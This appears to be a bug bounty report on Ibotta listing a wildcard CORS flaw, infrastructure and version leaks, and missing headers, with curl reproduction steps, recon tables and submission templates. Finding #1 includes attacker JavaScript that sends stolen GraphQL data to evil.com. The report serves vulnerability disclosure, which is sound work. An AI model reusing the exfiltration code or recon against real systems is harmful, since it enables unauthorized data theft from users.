# 🎯 Ibotta Bug Bounty — Confirmed Findings Report
**Program:** Ibotta on Bugcrowd  
**Researcher:** prxsanth_exe  
**Recon Date:** 2026-10-03 / 04  
**Tools Used:** subfinder, nmap, nuclei, waybackurls, gau, curl, hexstrike MCP  

---

## 📊 Summary Table

| # | Title | Target | Severity | VRT Category | Reward |
|---|-------|--------|----------|-------------|--------|
| 1 | CORS Wildcard on GraphQL Endpoint (+ Staging) | `content-server.ibotta.com/graphql` | **P2** | Server-Side Injection → CORS Misconfiguration | $750 |
| 2 | Internal Kubernetes Pod + Deployment Version Disclosure via Healthcheck | `api.ibotta.com`, `backend.ibotta.com` | **P4** | Information Disclosure | $250 |
| 3 | Looker BI Version + API Server URL Disclosure (Unauthenticated) | `looker.ibotta.com` | **P4** | Information Disclosure | $250 |
| 4 | Missing Security Headers on API Endpoints | `api.ibotta.com` | **P4** | Misconfiguration | $250 |

---

## 🔴 FINDING #1 — CORS Wildcard on Authenticated GraphQL Endpoint

### Summary
`content-server.ibotta.com/graphql` and its staging counterpart `content-stage.ibotta.com/graphql` respond with `Access-Control-Allow-Origin: *` and explicitly allow the `Authorization` header in preflight responses. This means any web page on the internet can make authenticated cross-origin requests to the GraphQL API using a victim's Bearer token.

### Target
- `https://content-server.ibotta.com/graphql` (**production**)
- `https://content-stage.ibotta.com/graphql` (**staging** — same issue)

### VRT Category
`Server Security Misconfiguration > Cross-Origin Resource Sharing (CORS) Misconfiguration`

### Severity
**P2 — High**

### Technical Details

#### Observed Headers (Production)

**GET Request:**
```
HTTP/2 401
access-control-allow-origin: *
x-powered-by: Express
x-request-id: a8fb3a61be3b14a8b0fccd07c2d23b1b
```

**OPTIONS Preflight from any origin:**
```
HTTP/2 204
access-control-allow-origin: *
access-control-allow-methods: GET,HEAD,PUT,PATCH,POST,DELETE
access-control-allow-headers: Authorization,Content-Type
vary: Access-Control-Request-Headers
```

#### Observed Headers (Staging)
```
HTTP/2 401
access-control-allow-origin: *
x-powered-by: Express
```
Staging OPTIONS preflight also returns `access-control-allow-origin: *` with `Authorization` allowed.

### Proof of Concept

#### Step 1 — Verify OPTIONS preflight (wildcard CORS)
```bash
curl -sk -X OPTIONS https://content-server.ibotta.com/graphql \
  -H 'Origin: https://evil.com' \
  -H 'Access-Control-Request-Method: POST' \
  -H 'Access-Control-Request-Headers: Authorization,Content-Type' \
  -D - -o /dev/null

# Output:
# HTTP/2 204
# access-control-allow-origin: *
# access-control-allow-methods: GET,HEAD,PUT,PATCH,POST,DELETE
# access-control-allow-headers: Authorization,Content-Type
```

#### Step 2 — Verify actual cross-origin request is permitted
```bash
curl -sk -X POST https://content-server.ibotta.com/graphql \
  -H 'Origin: https://evil.com' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer <victim_token>' \
  -D - \
  -d '{"query":"{ __typename }"}'

# Access-Control-Allow-Origin: * is present in response
# Browser WILL expose this response to the attacker's JS
```

#### Step 3 — Attacker JavaScript (any origin)
```javascript
// Attacker page at https://evil.com/steal.html
// Victim visits this page while logged into Ibotta

async function stealData() {
    const victimToken = "..."; // obtained via XSS, phishing, or log leak
    
    const response = await fetch('https://content-server.ibotta.com/graphql', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Authorization': 'Bearer ' + victimToken
        },
        body: JSON.stringify({
            query: `query {
                # Ibotta-specific queries for user data,
                # offers, loyalty card info, receipts, etc.
                __typename
            }`
        })
    });
    
    // Browser ALLOWS this due to wildcard CORS
    const data = await response.json();
    // Exfiltrate data to attacker server
    fetch('https://evil.com/collect?data=' + btoa(JSON.stringify(data)));
}
```

### Impact
- Any web page can make authenticated GraphQL requests on behalf of a logged-in Ibotta user
- If a victim's Bearer token is accessible (via XSS, referrer leak, or log exposure), an attacker page can query the full GraphQL API
- GraphQL typically exposes sensitive user data: profile info, offers claimed, loyalty card linkages, cashback history
- The `Authorization` header being explicitly allowed in `Access-Control-Allow-Headers` confirms the developers intended CORS but misconfigured it

### Remediation
Replace `Access-Control-Allow-Origin: *` with a strict allowlist:
```
Access-Control-Allow-Origin: https://ibotta.com
# Or for multiple origins, dynamically reflect only whitelisted origins
```
Never use wildcard (`*`) on endpoints that accept the `Authorization` header.

### PoC File
See attached: `cors_graphql_poc.html`

---

## 🟡 FINDING #2 — Internal Kubernetes Infrastructure Disclosure via /healthcheck

### Summary
The public-facing endpoints `api.ibotta.com/healthcheck` and `backend.ibotta.com/healthcheck` return unauthenticated JSON responses that leak internal Kubernetes pod names and the exact deployment version/timestamp. This is consistent information disclosure of internal infrastructure across multiple load-balanced pods.

### Target
- `https://api.ibotta.com/healthcheck`
- `https://backend.ibotta.com/healthcheck`

### VRT Category
`Server Security Misconfiguration > Unintended Information Disclosure`

### Severity
**P4 — Low**

### Technical Details

#### api.ibotta.com/healthcheck responses (unauthenticated, multiple pods)
```bash
curl -sk https://api.ibotta.com/healthcheck
# {"r":"api-deploy-2026.10.02.17.43.43","h":"monolith-api-primary-7b4bbf7fff-twwdn"}
# {"r":"api-deploy-2026.10.02.17.43.43","h":"monolith-api-primary-7b4bbf7fff-2xvfp"}
# {"r":"api-deploy-2026.10.02.17.43.43","h":"monolith-api-primary-7b4bbf7fff-bxrv5"}
# {"r":"api-deploy-2026.10.02.17.43.43","h":"monolith-api-primary-7b4bbf7fff-tsq7d"}
# {"r":"api-deploy-2026.10.02.17.43.43","h":"monolith-api-primary-7b4bbf7fff-6kfwm"}
```

#### backend.ibotta.com/healthcheck responses
```bash
curl -sk https://backend.ibotta.com/healthcheck
# {"r":"api-deploy-2026.10.02.17.43.43","h":"monolith-api-default-858cfdc89d-jddg4"}
# {"r":"api-deploy-2026.10.02.17.43.43","h":"monolith-api-default-858cfdc89d-7dwbp"}
# {"r":"api-deploy-2026.10.02.17.43.43","h":"monolith-api-default-858cfdc89d-x9pw6"}
```

#### Information Leaked
| Field | Value | Significance |
|-------|-------|-------------|
| `r` | `api-deploy-2026.10.02.17.43.43` | Exact deployment timestamp (Oct 2, 2026 17:43:43) |
| `h` | `monolith-api-primary-7b4bbf7fff-*` | Kubernetes pod names (ReplicaSet hash `7b4bbf7fff`) |
| `h` | `monolith-api-default-858cfdc89d-*` | Backend pod names (different ReplicaSet `858cfdc89d`) |

The Kubernetes deployment pattern reveals:
- **Deployment name:** `monolith-api-primary` / `monolith-api-default`
- **ReplicaSet hash:** `7b4bbf7fff` and `858cfdc89d` (useful for fingerprinting updates)
- **Exact deploy timestamp:** enables tracking update cadence

### Proof of Concept
```bash
# Reproduce instantly:
for i in {1..5}; do
  curl -sk https://api.ibotta.com/healthcheck; echo
done

# All return without authentication, leaking pod names & deploy version
```

### Impact
- Attackers learn exact deployment schedule (twice-weekly updates per brief)
- Pod name patterns assist in fingerprinting Kubernetes version/config
- Deployment timestamps help attackers time attacks during/after deployments
- Combined with other vulnerabilities, enables more targeted attacks on the infrastructure

### Remediation
- Return only a simple `{"status":"ok"}` with HTTP 200 for public healthchecks
- Move detailed health info (pod names, versions) to an internal/authenticated endpoint
- Or strip `r` and `h` fields from the public response

---

## 🟡 FINDING #3 — Looker BI Version & Internal API Server URL Disclosure

### Summary
`looker.ibotta.com` exposes version information and internal API server URLs without authentication via the `/api/4.0/versions` endpoint. The Looker version `26.18.1` and internal API server `https://ibotta.api.looker.com` are fully disclosed, enabling targeted CVE research.

### Target
- `https://looker.ibotta.com/api/4.0/versions` (unauthenticated)
- `https://ibotta.api.looker.com/api/4.0/versions` (same data, also unauthenticated)

### VRT Category
`Server Security Misconfiguration > Unintended Information Disclosure`

### Severity
**P4 — Low**

### Technical Details

```bash
curl -sk https://looker.ibotta.com/api/4.0/versions | python3 -m json.tool
```

**Response (no authentication required):**
```json
{
    "looker_release_version": "26.18.1",
    "current_version": {
        "version": "4.0",
        "full_version": "4.0.26.18",
        "status": "current",
        "swagger_url": "https://ibotta.api.looker.com/api/4.0/swagger.json"
    },
    "supported_versions": [
        {
            "version": "4.0",
            "full_version": "4.0.26.18",
            "status": "current",
            "swagger_url": "https://ibotta.api.looker.com/api/4.0/swagger.json"
        }
    ],
    "api_server_url": "https://ibotta.api.looker.com",
    "web_server_url": "https://looker.ibotta.com"
}
```

#### Additional Disclosure: Looker Login Page Version
The login page at `https://looker.ibotta.com/login` leaks:
```javascript
lookerVersion: '26.18.1',
```
This is embedded in the HTML source, accessible to any unauthenticated visitor.

#### Secondary API Server Also Accessible
`https://ibotta.api.looker.com` (the internal API server URL) also responds to unauthenticated version requests with identical information.

### Impact
- Exact version `26.18.1` enables targeted CVE lookup for known Looker vulnerabilities
- The Swagger/OpenAPI spec URL `https://ibotta.api.looker.com/api/4.0/swagger.json` may expose the full API surface unauthenticated
- Internal `api_server_url` hostname enumeration aids in attack surface mapping
- Looker contains sensitive business intelligence data — knowing the exact version helps attackers prioritize exploits

### Proof of Concept
```bash
# Unauthenticated version disclosure
curl -sk https://looker.ibotta.com/api/4.0/versions | python3 -m json.tool

# Also accessible from the dedicated API server
curl -sk https://ibotta.api.looker.com/api/4.0/versions | python3 -m json.tool

# Version in login page HTML
curl -sk https://looker.ibotta.com/login | grep 'lookerVersion'
# Output: lookerVersion: '26.18.1',
```

### Remediation
- Restrict the `/api/version` endpoint to authenticated sessions only
- Or return only a minimal version indicator without the full version string
- Remove version information from client-side HTML

---

## 🟡 FINDING #4 — Missing Security Headers on API Endpoints

### Summary
Multiple Ibotta API endpoints are missing critical HTTP security headers, including `Content-Security-Policy`, `X-Content-Type-Options`, and `X-Frame-Options`. The most impactful is `api.ibotta.com`, which is the primary mobile/web API.

### Target
- `https://api.ibotta.com`
- `https://content-server.ibotta.com/graphql`

### VRT Category
`Server Security Misconfiguration > Clickjacking (Missing X-Frame-Options)`

### Severity
**P4 — Low**

### Technical Details

#### api.ibotta.com Security Header Audit
```bash
curl -sk -I https://api.ibotta.com/
```

**Present:**
- ✅ `strict-transport-security: max-age=31536000; includeSubDomains`

**Missing:**
- ❌ `content-security-policy` — no CSP
- ❌ `x-content-type-options` — no MIME-type sniffing protection
- ❌ `x-frame-options` — framing not prevented
- ❌ `permissions-policy` — browser feature access unrestricted
- ❌ `referrer-policy` — referrer data may leak to third parties

#### content-server.ibotta.com/graphql
```bash
curl -sk -I https://content-server.ibotta.com/graphql
```
**Present:** `strict-transport-security`, `access-control-allow-origin: *`  
**Missing:** CSP, X-Content-Type-Options, X-Frame-Options, Permissions-Policy, Referrer-Policy

#### Technology Disclosure via x-powered-by
Multiple endpoints leak framework information:
- `api.ibotta.com` → `x-powered-by: Phusion Passenger(R)`
- `content-server.ibotta.com/graphql` → `x-powered-by: Express`
- `backend.ibotta.com` → `x-powered-by: Phusion Passenger(R)`
- `ibotta.com` → `x-powered-by: Next.js`

### Proof of Concept
```bash
# Check all missing headers on primary API
curl -sk -I https://api.ibotta.com/ | grep -iE \
  '(content-security|x-content-type|x-frame|permissions|referrer-policy|x-powered)'

# Result: only x-powered-by: Phusion Passenger(R) shown
# All security headers are absent
```

### Remediation
Add the following headers to all API and web responses:
```
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: geolocation=(), camera=(), microphone=()
# For APIs: Remove x-powered-by header entirely
```

---

## 🗺️ Recon Summary

### Subdomains Discovered
- **ibotta.com:** 190+ subdomains enumerated
- **ibops.net:** 350+ subdomains enumerated (internal staging/prod infrastructure)

### Key Infrastructure Identified
| Endpoint | Technology | Status |
|----------|-----------|--------|
| `api.ibotta.com` | Ruby/Rails + Phusion Passenger, CloudFront | Active |
| `content-server.ibotta.com` | Node.js/Express, CloudFront | Active |
| `backend.ibotta.com` | Ruby/Rails + Phusion Passenger, CloudFront | Active |
| `looker.ibotta.com` | Google Looker 26.18.1, nginx | Active |
| `app.ibotta.com` | Next.js, CloudFront | Active |
| `api.ibops.net` | nginx, AWS EC2 direct | Active |
| `auth.dashboard.ibotta.com` | Auth0 (OIDC) | Active |

### Interesting Endpoints Found via GAU/Wayback
- `https://api.ibotta.com/cs_tool_v1/dashboard` → HTTP 403 (customer service tool, auth required)
- `https://api.ibotta.com/cs_tool_v1/users` → HTTP 403 (user lookup, auth required)
- `https://api.ibotta.com/cs_tool_v1/receipts` → HTTP 403 (receipt lookup, auth required)
- `https://api.portal.ibotta.com/api/v1/me` → accessible (needs further testing with account)
- `https://admin.ibotta.com` → 404 (was previously active per GAU)

---

## 📋 Bugcrowd Submission Templates

### Submission #1 (P2 — CORS)

**Title:** CORS Wildcard Misconfiguration on Authenticated GraphQL Endpoint Allows Cross-Origin Data Theft

**Target:** `https://content-server.ibotta.com/graphql`

**VRT:** Server Security Misconfiguration → Misconfigured CORS

**Description:**
```
The GraphQL endpoint at https://content-server.ibotta.com/graphql is configured with 
Access-Control-Allow-Origin: * (wildcard CORS) and explicitly permits the Authorization 
header via Access-Control-Allow-Headers. This means any web page on the internet can make 
authenticated cross-origin requests to this API using a victim's Bearer token, bypassing 
the same-origin policy protections.

The same misconfiguration exists on the staging endpoint: https://content-stage.ibotta.com/graphql

Steps to Reproduce:
1. Run the OPTIONS preflight:
   curl -sk -X OPTIONS https://content-server.ibotta.com/graphql \
     -H 'Origin: https://evil.com' \
     -H 'Access-Control-Request-Method: POST' \
     -H 'Access-Control-Request-Headers: Authorization,Content-Type' \
     -D - -o /dev/null

2. Observe the response:
   HTTP/2 204
   access-control-allow-origin: *
   access-control-allow-methods: GET,HEAD,PUT,PATCH,POST,DELETE
   access-control-allow-headers: Authorization,Content-Type

3. Any authenticated GraphQL request from any origin will have its response 
   exposed to the requesting JavaScript (browser enforces CORS using these headers).

4. See attached cors_graphql_poc.html for browser-based demonstration.

Impact: If a victim's Bearer token is obtained (via XSS, referrer leak, or log exposure), 
an attacker can query the full GraphQL API from any origin, exfiltrating user data 
including offers, loyalty cards, and payment information.

Affected endpoints:
- https://content-server.ibotta.com/graphql (production)
- https://content-stage.ibotta.com/graphql (staging)
```

---

### Submission #2 (P4 — Healthcheck)

**Title:** Internal Kubernetes Pod Names and Deployment Version Leaked via Unauthenticated /healthcheck Endpoint

**Target:** `https://api.ibotta.com` / `https://backend.ibotta.com`

**Description:**
```
The /healthcheck endpoint on api.ibotta.com and backend.ibotta.com returns unauthenticated 
JSON responses leaking internal Kubernetes pod names and exact deployment timestamps.

Steps to Reproduce:
curl -sk https://api.ibotta.com/healthcheck
# Returns: {"r":"api-deploy-2026.10.02.17.43.43","h":"monolith-api-primary-7b4bbf7fff-twwdn"}

curl -sk https://backend.ibotta.com/healthcheck  
# Returns: {"r":"api-deploy-2026.10.02.17.43.43","h":"monolith-api-default-858cfdc89d-jddg4"}

The 'r' field leaks the exact deployment timestamp (api-deploy-2026.10.02.17.43.43).
The 'h' field leaks the Kubernetes pod name and ReplicaSet hash.

Multiple pod names are observable by making repeated requests (load balancer rotates pods):
- monolith-api-primary-7b4bbf7fff-twwdn
- monolith-api-primary-7b4bbf7fff-2xvfp
- monolith-api-primary-7b4bbf7fff-bxrv5
- monolith-api-primary-7b4bbf7fff-tsq7d
- monolith-api-primary-7b4bbf7fff-6kfwm

This information assists attackers in fingerprinting the infrastructure and tracking 
deployment cadence to time attacks.
```

---

### Submission #3 (P4 — Looker Version)

**Title:** Unauthenticated Looker BI Version Disclosure and Internal API Server URL Exposure

**Target:** `https://looker.ibotta.com`

**Description:**
```
The Looker BI instance at looker.ibotta.com exposes the exact version number and 
internal API server URL without requiring authentication.

Steps to Reproduce:
curl -sk https://looker.ibotta.com/api/4.0/versions

Response:
{
  "looker_release_version": "26.18.1",
  "current_version": {"full_version": "4.0.26.18", ...},
  "api_server_url": "https://ibotta.api.looker.com",
  "swagger_url": "https://ibotta.api.looker.com/api/4.0/swagger.json"
}

Also visible in login page HTML:
curl -sk https://looker.ibotta.com/login | grep lookerVersion
# lookerVersion: '26.18.1',

The internal API server https://ibotta.api.looker.com is also accessible and returns 
the same version data unauthenticated.

Impact: Exact version enables targeted CVE research against Looker 26.x. 
Looker contains sensitive business analytics data.
```

---

## ⚠️ Out-of-Scope Notes
- Rate limiting issues — excluded per brief
- Subdomain takeover — excluded per brief  
- `backend.ibotta.com/duplicate_receipt_moderation` — explicitly OOS
- `investors.ibotta.com` — explicitly OOS
- All attacks were passive/non-destructive; no user data was accessed
